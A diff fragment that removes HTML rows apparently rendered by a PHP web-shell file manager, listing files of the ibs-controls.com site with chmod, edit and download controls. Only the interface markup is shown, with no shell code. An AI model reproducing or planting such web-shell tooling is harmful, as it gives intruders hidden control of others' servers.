-<td>&nbsp;<a href="#" onclick="document.todo.act.value='f';document.todo.d.value='%2Fhome%2Fandrew%2Fwork%2Fibscontrols%2Fibs-controls.com';document.todo.f.value='logo.gif';document.todo.submit();">logo.gif</a></td>
-<td>5.72 KB</td>
-<td>20.07.2008 15:22:04</td>
-<td>andrew/andrew</td>
-<td>&nbsp;<a href="#" onclick="document.todo.act.value='chmod';document.todo.d.value='%2Fhome%2Fandrew%2Fwork%2Fibscontrols%2Fibs-controls.com';document.todo.f.value='logo.gif';document.todo.submit();"><b><font color=green>-rw-r--r--</font></b></a></td>
-<td><a href="#" onclick="document.todo.act.value='f';document.todo.f.value='logo.gif';document.todo.ft.value='info';document.todo.d.value='%2Fhome%2Fandrew%2Fwork%2Fibscontrols%2Fibs-controls.com';document.todo.submit();">I</a>&nbsp;<a href="#" onclick="document.todo.act.value='f';document.todo.f.value='logo.gif';document.todo.ft.value='edit';document.todo.d.value='%2Fhome%2Fandrew%2Fwork%2Fibscontrols%2Fibs-controls.com';document.todo.submit();">E</a>&nbsp;<a href="#" onclick="document.todo.act.value='f';document.todo.f.value='logo.gif';document.todo.ft.value='download';document.todo.d.value='%2Fhome%2Fandrew%2Fwork%2Fibscontrols%2Fibs-controls.com';document.todo.submit();">D</a>&nbsp;<input type="checkbox" name="actbox[]" id="actbox38" value="/home/andrew/work/ibscontrols/ibs-controls.com/logo.gif"></td>
-</tr>
-<tr>
-<td>&nbsp;<a href="#" onclick="document.todo.act.value='f';document.todo.d.value='%2Fhome%2Fandrew%2Fwork%2Fibscontrols%2Fibs-controls.com';document.todo.f.value='logo.rar';document.todo.submit();">logo.rar</a></td>
-<td>9.7 KB</td>
-<td>27.05.2008 21:17:39</td>
-<td>andrew/andrew</td>
-<td>&nbsp;<a href="#" onclick="document.todo.act.value='chmod';document.todo.d.value='%2Fhome%2Fandrew%2Fwork%2Fibscontrols%2Fibs-controls.com';document.todo.f.value='logo.rar';document.todo.submit();"><b><font color=green>-rwxrwxr-x</font></b></a></td>
-<td><a href="#" onclick="document.todo.act.value='f';document.todo.f.value='logo.rar';document.todo.ft.value='info';document.todo.d.value='%2Fhome%2Fandrew%2Fwork%2Fibscontrols%2Fibs-controls.com';document.todo.submit();">I</a>&nbsp;<a href="#" onclick="document.todo.act.value='f';document.todo.f.value='logo.rar';document.todo.ft.value='edit';document.todo.d.value='%2Fhome%2Fandrew%2Fwork%2Fibscontrols%2Fibs-controls.com';document.todo.submit();">E</a>&nbsp;<a href="#" onclick="document.todo.act.value='f';document.todo.f.value='logo.rar';document.todo.ft.value='download';document.todo.d.value='%2Fhome%2Fandrew%2Fwork%2Fibscontrols%2Fibs-controls.com';document.todo.submit();">D</a>&nbsp;<input type="checkbox" name="actbox[]" id="actbox39" value="/home/andrew/work/ibscontrols/ibs-controls.com/logo.rar"></td>
-</tr>
-<tr>
-<td>&nbsp;<a href="#" onclick="document.todo.act.value='f';document.todo.d.value='%2Fhome%2Fandrew%2Fwork%2Fibscontrols%2Fibs-controls.com';document.todo.f.value='logout.php';document.todo.submit();">logout.php</a></td>
-<td>60 B</td>
-<td>21.05.2008 21:19:11</td>
-<td>andrew/andrew</td>
-<td>&nbsp;<a href="#" onclick="document.todo.act.value='chmod';document.todo.d.value='%2Fhome%2Fandrew%2Fwork%2Fibscontrols%2Fibs-controls.com';document.todo.f.value='logout.php';document.todo.submit();"><b><font color=green>-rw-r--r--</font></b></a></td>
-<td><a href="#" onclick="document.todo.act.value='f';document.todo.f.value='logout.php';document.todo.ft.value='info';document.todo.d.value='%2Fhome%2Fandrew%2Fwork%2Fibscontrols%2Fibs-controls.com';document.todo.submit();">I</a>&nbsp;<a href="#" onclick="document.todo.act.value='f';document.todo.f.value='logout.php';document.todo.ft.value='edit';document.todo.d.value='%2Fhome%2Fandrew%2Fwork%2Fibscontrols%2Fibs-controls.com';document.todo.submit();">E</a>&nbsp;<a href="#" onclick="document.todo.act.value='f';document.todo.f.value='logout.php';document.todo.ft.value='download';document.todo.d.value='%2Fhome%2Fandrew%2Fwork%2Fibscontrols%2Fibs-controls.com';document.todo.submit();">D</a>&nbsp;<input type="checkbox" name="actbox[]" id="actbox40" value="/home/andrew/work/ibscontrols/ibs-controls.com/logout.php"></td>
-</tr>
-<tr>
-<td>&nbsp;<a href="#" onclick="document.todo.act.value='f';document.todo.d.value='%2Fhome%2Fandrew%2Fwork%2Fibscontrols%2Fibs-controls.com';document.todo.f.value='mail.php';document.todo.submit();">mail.php</a></td>
-<td>157 B</td>
-<td>12.02.2014 10:06:04</td>
-<td>andrew/andrew</td>
-<td>&nbsp;<a href="#" onclick="document.todo.act.value='chmod';document.todo.d.value='%2Fhome%2Fandrew%2Fwork%2Fibscontrols%2Fibs-controls.com';document.todo.f.value='mail.php';document.todo.submit();"><b><font color=green>-rw-r--r--</font></b></a></td>
-<td><a href="#" onclick="document.todo.act.value='f';document.todo.f.value='mail.php';document.todo.ft.value='info';document.todo.d.value='%2Fhome%2Fandrew%2Fwork%2Fibscontrols%2Fibs-controls.com';document.todo.submit();">I</a>&nbsp;<a href="#" onclick="document.todo.act.value='f';document.todo.f.value='mail.php';document.todo.ft.value='edit';document.todo.d.value='%2Fhome%2Fandrew%2Fwork%2Fibscontrols%2Fibs-controls.com';document.todo.submit();">E</a>&nbsp;<a href="#" onclick="document.todo.act.value='f';document.todo.f.value='mail.php';document.todo.ft.value='download';document.todo.d.value='%2Fhome%2Fandrew%2Fwork%2Fibscontrols%2Fibs-controls.com';document.todo.submit();">D</a>&nbsp;<input type="checkbox" name="actbox[]" id="actbox41" value="/home/andrew/work/ibscontrols/ibs-controls.com/mail.php"></td>
-</tr>
-<tr>
-<td>&nbsp;<a href="#" onclick="document.todo.act.value='f';document.todo.d.value='%2Fhome%2Fandrew%2Fwork%2Fibscontrols%2Fibs-controls.com';document.todo.f.value='mailtest.php';document.todo.submit();">mailtest.php</a></td>
-<td>1.87 KB</td>
-<td>21.05.2008 21:19:12</td>
-<td>andrew/andrew</td>
-<td>&nbsp;<a href="#" onclick="document.todo.act.value='chmod';document.todo.d.value='%2Fhome%2Fandrew%2Fwork%2Fibscontrols%2Fibs-controls.com';document.todo.f.value='mailtest.php';document.todo.submit();"><b><font color=green>-rw-r--r--</font></b></a></td>
-<td><a href="#" onclick="document.todo.act.value='f';document.todo.f.value='mailtest.php';document.todo.ft.value='info';document.todo.d.value='%2Fhome%2Fandrew%2Fwork%2Fibscontrols%2Fibs-controls.com';document.todo.submit();">I</a>&nbsp;<a href="#" onclick="document.todo.act.value='f';document.todo.f.value='mailtest.php';document.todo.ft.value='edit';document.todo.d.value='%2Fhome%2Fandrew%2Fwork%2Fibscontrols%2Fibs-controls.com';document.todo.submit();">E</a>&nbsp;<a href="#" onclick="document.todo.act.value='f';document.todo.f.value='mailtest.php';document.todo.ft.value='download';document.todo.d.value='%2Fhome%2Fandrew%2Fwork%2Fibscontrols%2Fibs-controls.com';document.todo.submit();">D</a>&nbsp;<input type="checkbox" name="actbox[]" id="actbox42" value="/home/andrew/work/ibscontrols/ibs-controls.com/mailtest.php"></td>
-</tr>
-<tr>
-<td>&nbsp;<a href="#" onclick="document.todo.act.value='f';document.todo.d.value='%2Fhome%2Fandrew%2Fwork%2Fibscontrols%2Fibs-controls.com';document.todo.f.value='make.php';document.todo.submit();">make.php</a></td>
-<td>253 B</td>
-<td>22.05.2008 13:36:26</td>
-<td>andrew/andrew</td>
-<td>&nbsp;<a href="#" onclick="document.todo.act.value='chmod';document.todo.d.value='%2Fhome%2Fandrew%2Fwork%2Fibscontrols%2Fibs-controls.com';document.todo.f.value='make.php';document.todo.submit();"><b><font color=green>-rw-r--r--</font></b></a></td>
-<td><a href="#" onclick="document.todo.act.value='f';document.todo.f.value='make.php';document.todo.ft.value='info';document.todo.d.value='%2Fhome%2Fandrew%2Fwork%2Fibscontrols%2Fibs-controls.com';document.todo.submit();">I</a>&nbsp;<a href="#" onclick="document.todo.act.value='f';document.todo.f.value='make.php';document.todo.ft.value='edit';document.todo.d.value='%2Fhome%2Fandrew%2Fwork%2Fibscontrols%2Fibs-controls.com';document.todo.submit();">E</a>&nbsp;<a href="#" onclick="document.todo.act.value='f';document.todo.f.value='make.php';document.todo.ft.value='download';document.todo.d.value='%2Fhome%2Fandrew%2Fwork%2Fibscontrols%2Fibs-controls.com';document.todo.submit();">D</a>&nbsp;<input type="checkbox" name="actbox[]" id="actbox43" value="/home/andrew/work/ibscontrols/ibs-controls.com/make.php"></td>
-</tr>
-<tr>
-<td>&nbsp;<a href="#" onclick="document.todo.act.value='f';document.todo.d.value='%2Fhome%2Fandrew%2Fwork%2Fibscontrols%2Fibs-controls.com';document.todo.f.value='php.php';document.todo.submit();">php.php</a></td>
-<td>19 B</td>
-<td>22.05.2008 13:34:16</td>
-<td>andrew/andrew</td>
-<td>&nbsp;<a href="#" onclick="document.todo.act.value='chmod';document.todo.d.value='%2Fhome%2Fandrew%2Fwork%2Fibscontrols%2Fibs-controls.com';document.todo.f.value='php.php';document.todo.submit();"><b><font color=green>-rw-r--r--</font></b></a></td>
-<td><a href="#" onclick="document.todo.act.value='f';document.todo.f.value='php.php';document.todo.ft.value='info';document.todo.d.value='%2Fhome%2Fandrew%2Fwork%2Fibscontrols%2Fibs-controls.com';document.todo.submit();">I</a>&nbsp;<a href="#" onclick="document.todo.act.value='f';document.todo.f.value='php.php';document.todo.ft.value='edit';document.todo.d.value='%2Fhome%2Fandrew%2Fwork%2Fibscontrols%2Fibs-controls.com';document.todo.submit();">E</a>&nbsp;<a href="#" onclick="document.todo.act.value='f';document.todo.f.value='php.php';document.todo.ft.value='download';document.todo.d.value='%2Fhome%2Fandrew%2Fwork%2Fibscontrols%2Fibs-controls.com';document.todo.submit();">D</a>&nbsp;<input type="checkbox" name="actbox[]" id="actbox44" value="/home/andrew/work/ibscontrols/ibs-controls.com/php.php"></td>
-</tr>
-<tr>
-<td>&nbsp;<a href="#" onclick="document.todo.act.value='f';document.todo.d.value='%2Fhome%2Fandrew%2Fwork%2Fibscontrols%2Fibs-controls.com';document.todo.f.value='price.php';document.todo.submit();">price.php</a></td>
-<td>4.33 KB</td>
-<td>21.05.2008 21:19:12</td>
-<td>andrew/andrew</td>
-<td>&nbsp;<a href="#" onclick="document.todo.act.value='chmod';document.todo.d.value='%2Fhome%2Fandrew%2Fwork%2Fibscontrols%2Fibs-controls.com';document.todo.f.value='price.php';document.todo.submit();"><b><font color=green>-rw-r--r--</font></b></a></td>
-<td><a href="#" onclick="document.todo.act.value='f';document.todo.f.value='price.php';document.todo.ft.value='info';document.todo.d.value='%2Fhome%2Fandrew%2Fwork%2Fibscontrols%2Fibs-controls.com';document.todo.submit();">I</a>&nbsp;<a href="#" onclick="document.todo.act.value='f';document.todo.f.value='price.php';document.todo.ft.value='edit';document.todo.d.value='%2Fhome%2Fandrew%2Fwork%2Fibscontrols%2Fibs-controls.com';document.todo.submit();">E</a>&nbsp;<a href="#" onclick="document.todo.act.value='f';document.todo.f.value='price.php';document.todo.ft.value='download';document.todo.d.value='%2Fhome%2Fandrew%2Fwork%2Fibscontrols%2Fibs-controls.com';document.todo.submit();">D</a>&nbsp;<input type="checkbox" name="actbox[]" id="actbox45" value="/home/andrew/work/ibscontrols/ibs-controls.com/price.php"></td>
-</tr>
-<tr>
-<td>&nbsp;<a href="#" onclick="document.todo.act.value='f';document.todo.d.value='%2Fhome%2Fandrew%2Fwork%2Fibscontrols%2Fibs-controls.com';document.todo.f.value='privacyinfo.php';document.todo.submit();">privacyinfo.php</a></td>
-<td>177 B</td>
-<td>21.05.2008 21:19:12</td>
-<td>andrew/andrew</td>
-<td>&nbsp;<a href="#" onclick="document.todo.act.value='chmod';document.todo.d.value='%2Fhome%2Fandrew%2Fwork%2Fibscontrols%2Fibs-controls.com';document.todo.f.value='privacyinfo.php';document.todo.submit();"><b><font color=green>-rw-r--r--</font></b></a></td>
-<td><a href="#" onclick="document.todo.act.value='f';document.todo.f.value='privacyinfo.php';document.todo.ft.value='info';document.todo.d.value='%2Fhome%2Fandrew%2Fwork%2Fibscontrols%2Fibs-controls.com';document.todo.submit();">I</a>&nbsp;<a href="#" onclick="document.todo.act.value='f';document.todo.f.value='privacyinfo.php';document.todo.ft.value='edit';document.todo.d.value='%2Fhome%2Fandrew%2Fwork%2Fibscontrols%2Fibs-controls.com';document.todo.submit();">E</a>&nbsp;<a href="#" onclick="document.todo.act.value='f';document.todo.f.value='privacyinfo.php';document.todo.ft.value='download';document.todo.d.value='%2Fhome%2Fandrew%2Fwork%2Fibscontrols%2Fibs-controls.com';document.todo.submit();">D</a>&nbsp;<input type="checkbox" name="actbox[]" id="actbox46" value="/home/andrew/work/ibscontrols/ibs-controls.com/privacyinfo.php"></td>
-</tr>
-<tr>
-<td>&nbsp;<a href="#" onclick="document.todo.act.value='f';document.todo.d.value='%2Fhome%2Fandrew%2Fwork%2Fibscontrols%2Fibs-controls.com';document.todo.f.value='product.php';document.todo.submit();">product.php</a></td>
-<td>994 B</td>
-<td>28.10.2008 21:31:53</td>
-<td>andrew/andrew</td>
-<td>&nbsp;<a href="#" onclick="document.todo.act.value='chmod';document.todo.d.value='%2Fhome%2Fandrew%2Fwork%2Fibscontrols%2Fibs-controls.com';document.todo.f.value='product.php';document.todo.submit();"><b><font color=green>-rw-r--r--</font></b></a></td>
-<td><a href="#" onclick="document.todo.act.value='f';document.todo.f.value='product.php';document.todo.ft.value='info';document.todo.d.value='%2Fhome%2Fandrew%2Fwork%2Fibscontrols%2Fibs-controls.com';document.todo.submit();">I</a>&nbsp;<a href="#" onclick="document.todo.act.value='f';document.todo.f.value='product.php';document.todo.ft.value='edit';document.todo.d.value='%2Fhome%2Fandrew%2Fwork%2Fibscontrols%2Fibs-controls.com';document.todo.submit();">E</a>&nbsp;<a href="#" onclick="document.todo.act.value='f';document.todo.f.value='product.php';document.todo.ft.value='download';document.todo.d.value='%2Fhome%2Fandrew%2Fwork%2Fibscontrols%2Fibs-controls.com';document.todo.submit();">D</a>&nbsp;<input type="checkbox" name="actbox[]" id="actbox47" value="/home/andrew/work/ibscontrols/ibs-controls.com/product.php"></td>
-</tr>
-<tr>
-<td>&nbsp;<a href="#" onclick="document.todo.act.value='f';document.todo.d.value='%2Fhome%2Fandrew%2Fwork%2Fibscontrols%2Fibs-controls.com';document.todo.f.value='products.css';document.todo.submit();">products.css</a></td>
-<td>890 B</td>
-<td>10.10.2008 21:46:17</td>
-<td>andrew/andrew</td>
-<td>&nbsp;<a href="#" onclick="document.todo.act.value='chmod';document.todo.d.value='%2Fhome%2Fandrew%2Fwork%2Fibscontrols%2Fibs-controls.com';document.todo.f.value='products.css';document.todo.submit();"><b><font color=green>-rw-r--r--</font></b></a></td>
-<td><a href="#" onclick="document.todo.act.value='f';document.todo.f.value='products.css';document.todo.ft.value='info';document.todo.d.value='%2Fhome%2Fandrew%2Fwork%2Fibscontrols%2Fibs-controls.com';document.todo.submit();">I</a>&nbsp;<a href="#" onclick="document.todo.act.value='f';document.todo.f.value='products.css';document.todo.ft.value='edit';document.todo.d.value='%2Fhome%2Fandrew%2Fwork%2Fibscontrols%2Fibs-controls.com';document.todo.submit();">E</a>&nbsp;<a href="#" onclick="document.todo.act.value='f';document.todo.f.value='products.css';document.todo.ft.value='download';document.todo.d.value='%2Fhome%2Fandrew%2Fwork%2Fibscontrols%2Fibs-controls.com';document.todo.submit();">D</a>&nbsp;<input type="checkbox" name="actbox[]" id="actbox48" value="/home/andrew/work/ibscontrols/ibs-controls.com/products.css"></td>
-</tr>
-<tr>
-<td>&nbsp;<a href="#" onclick="document.todo.act.value='f';document.todo.d.value='%2Fhome%2Fandrew%2Fwork%2Fibscontrols%2Fibs-controls.com';document.todo.f.value='robots.txt';document.todo.submit();">robots.txt</a></td>
-<td>27 B</td>
-<td>02.12.2008 10:45:31</td>
-<td>andrew/andrew</td>
-<td>&nbsp;<a href="#" onclick="document.todo.act.value='chmod';document.todo.d.value='%2Fhome%2Fandrew%2Fwork%2Fibscontrols%2Fibs-controls.com';document.todo.f.value='robots.txt';document.todo.submit();"><b><font color=green>-rw-r--r--</font></b></a></td>
-<td><a href="#" onclick="document.todo.act.value='f';document.todo.f.value='robots.txt';document.todo.ft.value='info';document.todo.d.value='%2Fhome%2Fandrew%2Fwork%2Fibscontrols%2Fibs-controls.com';document.todo.submit();">I</a>&nbsp;<a href="#" onclick="document.todo.act.value='f';document.todo.f.value='robots.txt';document.todo.ft.value='edit';document.todo.d.value='%2Fhome%2Fandrew%2Fwork%2Fibscontrols%2Fibs-controls.com';document.todo.submit();">E</a>&nbsp;<a href="#" onclick="document.todo.act.value='f';document.todo.f.value='robots.txt';document.todo.ft.value='download';document.todo.d.value='%2Fhome%2Fandrew%2Fwork%2Fibscontrols%2Fibs-controls.com';document.todo.submit();">D</a>&nbsp;<input type="checkbox" name="actbox[]" id="actbox49" value="/home/andrew/work/ibscontrols/ibs-controls.com/robots.txt"></td>
-</tr>
-<tr>
-<td>&nbsp;<a href="#" onclick="document.todo.act.value='f';document.todo.d.value='%2Fhome%2Fandrew%2Fwork%2Fibscontrols%2Fibs-controls.com';document.todo.f.value='root.php';document.todo.submit();">root.php</a></td>
-<td>126 B</td>
-<td>22.05.2008 19:13:20</td>
-<td>andrew/andrew</td>
-<td>&nbsp;<a href="#" onclick="document.todo.act.value='chmod';document.todo.d.value='%2Fhome%2Fandrew%2Fwork%2Fibscontrols%2Fibs-controls.com';document.todo.f.value='root.php';document.todo.submit();"><b><font color=green>-rw-r--r--</font></b></a></td>
-<td><a href="#" onclick="document.todo.act.value='f';document.todo.f.value='root.php';document.todo.ft.value='info';document.todo.d.value='%2Fhome%2Fandrew%2Fwork%2Fibscontrols%2Fibs-controls.com';document.todo.submit();">I</a>&nbsp;<a href="#" onclick="document.todo.act.value='f';document.todo.f.value='root.php';document.todo.ft.value='edit';document.todo.d.value='%2Fhome%2Fandrew%2Fwork%2Fibscontrols%2Fibs-controls.com';document.todo.submit();">E</a>&nbsp;<a href="#" onclick="document.todo.act.value='f';document.todo.f.value='root.php';document.todo.ft.value='download';document.todo.d.value='%2Fhome%2Fandrew%2Fwork%2Fibscontrols%2Fibs-controls.com';document.todo.submit();">D</a>&nbsp;<input type="checkbox" name="actbox[]" id="actbox50" value="/home/andrew/work/ibscontrols/ibs-controls.com/root.php"></td>
-</tr>
-<tr>
-<td>&nbsp;<a href="#" onclick="document.todo.act.value='f';document.todo.d.value='%2Fhome%2Fandrew%2Fwork%2Fibscontrols%2Fibs-controls.com';document.todo.f.value='search.php';document.todo.submit();">search.php</a></td>
-<td>961 B</td>
-<td>21.05.2008 21:19:12</td>
-<td>andrew/andrew</td>
-<td>&nbsp;<a href="#" onclick="document.todo.act.value='chmod';document.todo.d.value='%2Fhome%2Fandrew%2Fwork%2Fibscontrols%2Fibs-controls.com';document.todo.f.value='search.php';document.todo.submit();"><b><font color=green>-rw-r--r--</font></b></a></td>
-<td><a href="#" onclick="document.todo.act.value='f';document.todo.f.value='search.php';document.todo.ft.value='info';document.todo.d.value='%2Fhome%2Fandrew%2Fwork%2Fibscontrols%2Fibs-controls.com';document.todo.submit();">I</a>&nbsp;<a href="#" onclick="document.todo.act.value='f';document.todo.f.value='search.php';document.todo.ft.value='edit';document.todo.d.value='%2Fhome%2Fandrew%2Fwork%2Fibscontrols%2Fibs-controls.com';document.todo.submit();">E</a>&nbsp;<a href="#" onclick="document.todo.act.value='f';document.todo.f.value='search.php';document.todo.ft.value='download';document.todo.d.value='%2Fhome%2Fandrew%2Fwork%2Fibscontrols%2Fibs-controls.com';document.todo.submit();">D</a>&nbsp;<input type="checkbox" name="actbox[]" id="actbox51" value="/home/andrew/work/ibscontrols/ibs-controls.com/search.php"></td>
-</tr>
-<tr>
-<td>&nbsp;<a href="#" onclick="document.todo.act.value='f';document.todo.d.value='%2Fhome%2Fandrew%2Fwork%2Fibscontrols%2Fibs-controls.com';document.todo.f.value='shipping.php';document.todo.submit();">shipping.php</a></td>
-<td>1.78 KB</td>
-<td>21.05.2008 21:19:11</td>
-<td>andrew/andrew</td>
-<td>&nbsp;<a href="#" onclick="document.todo.act.value='chmod';document.todo.d.value='%2Fhome%2Fandrew%2Fwork%2Fibscontrols%2Fibs-controls.com';document.todo.f.value='shipping.php';document.todo.submit();"><b><font color=green>-rw-r--r--</font></b></a></td>
-<td><a href="#" onclick="document.todo.act.value='f';document.todo.f.value='shipping.php';document.todo.ft.value='info';document.todo.d.value='%2Fhome%2Fandrew%2Fwork%2Fibscontrols%2Fibs-controls.com';document.todo.submit();">I</a>&nbsp;<a href="#" onclick="document.todo.act.value='f';document.todo.f.value='shipping.php';document.todo.ft.value='edit';document.todo.d.value='%2Fhome%2Fandrew%2Fwork%2Fibscontrols%2Fibs-controls.com';document.todo.submit();">E</a>&nbsp;<a href="#" onclick="document.todo.act.value='f';document.todo.f.value='shipping.php';document.todo.ft.value='download';document.todo.d.value='%2Fhome%2Fandrew%2Fwork%2Fibscontrols%2Fibs-controls.com';document.todo.submit();">D</a>&nbsp;<input type="checkbox" name="actbox[]" id="actbox52" value="/home/andrew/work/ibscontrols/ibs-controls.com/shipping.php"></td>
-</tr>
-<tr>
-<td>&nbsp;<a href="#" onclick="document.todo.act.value='f';document.todo.d.value='%2Fhome%2Fandrew%2Fwork%2Fibscontrols%2Fibs-controls.com';document.todo.f.value='specials.php';document.todo.submit();">specials.php</a></td>
-<td>452 B</td>
-<td>21.05.2008 21:19:11</td>
-<td>andrew/andrew</td>
-<td>&nbsp;<a href="#" onclick="document.todo.act.value='chmod';document.todo.d.value='%2Fhome%2Fandrew%2Fwork%2Fibscontrols%2Fibs-controls.com';document.todo.f.value='specials.php';document.todo.submit();"><b><font color=green>-rw-r--r--</font></b></a></td>
-<td><a href="#" onclick="document.todo.act.value='f';document.todo.f.value='specials.php';document.todo.ft.value='info';document.todo.d.value='%2Fhome%2Fandrew%2Fwork%2Fibscontrols%2Fibs-controls.com';document.todo.submit();">I</a>&nbsp;<a href="#" onclick="document.todo.act.value='f';document.todo.f.value='specials.php';document.todo.ft.value='edit';document.todo.d.value='%2Fhome%2Fandrew%2Fwork%2Fibscontrols%2Fibs-controls.com';document.todo.submit();">E</a>&nbsp;<a href="#" onclick="document.todo.act.value='f';document.todo.f.value='specials.php';document.todo.ft.value='download';document.todo.d.value='%2Fhome%2Fandrew%2Fwork%2Fibscontrols%2Fibs-controls.com';document.todo.submit();">D</a>&nbsp;<input type="checkbox" name="actbox[]" id="actbox53" value="/home/andrew/work/ibscontrols/ibs-controls.com/specials.php"></td>
-</tr>
-<tr>
-<td>&nbsp;<a href="#" onclick="document.todo.act.value='f';document.todo.d.value='%2Fhome%2Fandrew%2Fwork%2Fibscontrols%2Fibs-controls.com';document.todo.f.value='style.css';document.todo.submit();">style.css</a></td>
-<td>4.53 KB</td>
-<td>15.12.2008 10:08:23</td>
-<td>andrew/andrew</td>
-<td>&nbsp;<a href="#" onclick="document.todo.act.value='chmod';document.todo.d.value='%2Fhome%2Fandrew%2Fwork%2Fibscontrols%2Fibs-controls.com';document.todo.f.value='style.css';document.todo.submit();"><b><font color=green>-rw-r--r--</font></b></a></td>
-<td><a href="#" onclick="document.todo.act.value='f';document.todo.f.value='style.css';document.todo.ft.value='info';document.todo.d.value='%2Fhome%2Fandrew%2Fwork%2Fibscontrols%2Fibs-controls.com';document.todo.submit();">I</a>&nbsp;<a href="#" onclick="document.todo.act.value='f';document.todo.f.value='style.css';document.todo.ft.value='edit';document.todo.d.value='%2Fhome%2Fandrew%2Fwork%2Fibscontrols%2Fibs-controls.com';document.todo.submit();">E</a>&nbsp;<a href="#" onclick="document.todo.act.value='f';document.todo.f.value='style.css';document.todo.ft.value='download';document.todo.d.value='%2Fhome%2Fandrew%2Fwork%2Fibscontrols%2Fibs-controls.com';document.todo.submit();">D</a>&nbsp;<input type="checkbox" name="actbox[]" id="actbox54" value="/home/andrew/work/ibscontrols/ibs-controls.com/style.css"></td>
-</tr>
-<tr>
-<td>&nbsp;<a href="#" onclick="document.todo.act.value='f';document.todo.d.value='%2Fhome%2Fandrew%2Fwork%2Fibscontrols%2Fibs-controls.com';document.todo.f.value='style2.css';document.todo.submit();">style2.css</a></td>
-<td>4.14 KB</td>
-<td>21.05.2008 21:19:11</td>
-<td>andrew/andrew</td>
-<td>&nbsp;<a href="#" onclick="document.todo.act.value='chmod';document.todo.d.value='%2Fhome%2Fandrew%2Fwork%2Fibscontrols%2Fibs-controls.com';document.todo.f.value='style2.css';document.todo.submit();"><b><font color=green>-rw-r--r--</font></b></a></td>
-<td><a href="#" onclick="document.todo.act.value='f';document.todo.f.value='style2.css';document.todo.ft.value='info';document.todo.d.value='%2Fhome%2Fandrew%2Fwork%2Fibscontrols%2Fibs-controls.com';document.todo.submit();">I</a>&nbsp;<a href="#" onclick="document.todo.act.value='f';document.todo.f.value='style2.css';document.todo.ft.value='edit';document.todo.d.value='%2Fhome%2Fandrew%2Fwork%2Fibscontrols%2Fibs-controls.com';document.todo.submit();">E</a>&nbsp;<a href="#" onclick="document.todo.act.value='f';document.todo.f.value='style2.css';document.todo.ft.value='download';document.todo.d.value='%2Fhome%2Fandrew%2Fwork%2Fibscontrols%2Fibs-controls.com';document.todo.submit();">D</a>&nbsp;<input type="checkbox" name="actbox[]" id="actbox55" value="/home/andrew/work/ibscontrols/ibs-controls.com/style2.css"></td>
-</tr>
-<tr>
-<td>&nbsp;<a href="#" onclick="document.todo.act.value='f';document.todo.d.value='%2Fhome%2Fandrew%2Fwork%2Fibscontrols%2Fibs-controls.com';document.todo.f.value='style_print.css';document.todo.submit();">style_print.css</a></td>
-<td>275 B</td>
-<td>21.05.2008 21:19:12</td>
-<td>andrew/andrew</td>
-<td>&nbsp;<a href="#" onclick="document.todo.act.value='chmod';document.todo.d.value='%2Fhome%2Fandrew%2Fwork%2Fibscontrols%2Fibs-controls.com';document.todo.f.value='style_print.css';document.todo.submit();"><b><font color=green>-rw-r--r--</font></b></a></td>
-<td><a href="#" onclick="document.todo.act.value='f';document.todo.f.value='style_print.css';document.todo.ft.value='info';document.todo.d.value='%2Fhome%2Fandrew%2Fwork%2Fibscontrols%2Fibs-controls.com';document.todo.submit();">I</a>&nbsp;<a href="#" onclick="document.todo.act.value='f';document.todo.f.value='style_print.css';document.todo.ft.value='edit';document.todo.d.value='%2Fhome%2Fandrew%2Fwork%2Fibscontrols%2Fibs-controls.com';document.todo.submit();">E</a>&nbsp;<a href="#" onclick="document.todo.act.value='f';document.todo.f.value='style_print.css';document.todo.ft.value='download';document.todo.d.value='%2Fhome%2Fandrew%2Fwork%2Fibscontrols%2Fibs-controls.com';document.todo.submit();">D</a>&nbsp;<input type="checkbox" name="actbox[]" id="actbox56" value="/home/andrew/work/ibscontrols/ibs-controls.com/style_print.css"></td>
-</tr>
-<tr>
-<td>&nbsp;<a href="#" onclick="document.todo.act.value='f';document.todo.d.value='%2Fhome%2Fandrew%2Fwork%2Fibscontrols%2Fibs-controls.com';document.todo.f.value='test.php';document.todo.submit();">test.php</a></td>
-<td>37 B</td>
-<td>21.05.2008 21:19:11</td>
-<td>andrew/andrew</td>
-<td>&nbsp;<a href="#" onclick="document.todo.act.value='chmod';document.todo.d.value='%2Fhome%2Fandrew%2Fwork%2Fibscontrols%2Fibs-controls.com';document.todo.f.value='test.php';document.todo.submit();"><b><font color=green>-rw-r--r--</font></b></a></td>
-<td><a href="#" onclick="document.todo.act.value='f';document.todo.f.value='test.php';document.todo.ft.value='info';document.todo.d.value='%2Fhome%2Fandrew%2Fwork%2Fibscontrols%2Fibs-controls.com';document.todo.submit();">I</a>&nbsp;<a href="#" onclick="document.todo.act.value='f';document.todo.f.value='test.php';document.todo.ft.value='edit';document.todo.d.value='%2Fhome%2Fandrew%2Fwork%2Fibscontrols%2Fibs-controls.com';document.todo.submit();">E</a>&nbsp;<a href="#" onclick="document.todo.act.value='f';document.todo.f.value='test.php';document.todo.ft.value='download';document.todo.d.value='%2Fhome%2Fandrew%2Fwork%2Fibscontrols%2Fibs-controls.com';document.todo.submit();">D</a>&nbsp;<input type="checkbox" name="actbox[]" id="actbox57" value="/home/andrew/work/ibscontrols/ibs-controls.com/test.php"></td>
-</tr>
-<tr>
-<td>&nbsp;<a href="#" onclick="document.todo.act.value='f';document.todo.d.value='%2Fhome%2Fandrew%2Fwork%2Fibscontrols%2Fibs-controls.com';document.todo.f.value='time.php';document.todo.submit();">time.php</a></td>
-<td>1.01 KB</td>
-<td>21.05.2008 21:19:12</td>
-<td>andrew/andrew</td>
-<td>&nbsp;<a href="#" onclick="document.todo.act.value='chmod';document.todo.d.value='%2Fhome%2Fandrew%2Fwork%2Fibscontrols%2Fibs-controls.com';document.todo.f.value='time.php';document.todo.submit();"><b><font color=green>-rw-r--r--</font></b></a></td>
-<td><a href="#" onclick="document.todo.act.value='f';document.todo.f.value='time.php';document.todo.ft.value='info';document.todo.d.value='%2Fhome%2Fandrew%2Fwork%2Fibscontrols%2Fibs-controls.com';document.todo.submit();">I</a>&nbsp;<a href="#" onclick="document.todo.act.value='f';document.todo.f.value='time.php';document.todo.ft.value='edit';document.todo.d.value='%2Fhome%2Fandrew%2Fwork%2Fibscontrols%2Fibs-controls.com';document.todo.submit();">E</a>&nbsp;<a href="#" onclick="document.todo.act.value='f';document.todo.f.value='time.php';document.todo.ft.value='download';document.todo.d.value='%2Fhome%2Fandrew%2Fwork%2Fibscontrols%2Fibs-controls.com';document.todo.submit();">D</a>&nbsp;<input type="checkbox" name="actbox[]" id="actbox58" value="/home/andrew/work/ibscontrols/ibs-controls.com/time.php"></td>
-</tr>
-<tr>
